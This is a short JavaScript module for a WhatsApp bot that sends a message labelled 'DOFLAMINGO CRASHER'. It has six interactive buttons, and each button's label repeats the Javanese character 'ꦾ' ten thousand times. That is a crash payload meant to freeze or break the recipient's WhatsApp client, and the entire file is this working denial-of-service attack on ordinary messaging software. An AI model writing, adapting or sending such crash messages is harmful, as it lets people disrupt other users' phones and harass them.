async function test(message, sock) {
  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
      image: { url: "menu2.jpg" }, // Replace with local or hosted image
      caption: "𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑",
      footer: "My Awesome Bot 🔥",
      media: true,
      interactiveButtons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 1${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 2${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 3${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 1${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 2${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 3${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        }

      ]
    },
    {
      quoted: message
    }
  );
}

export default test;
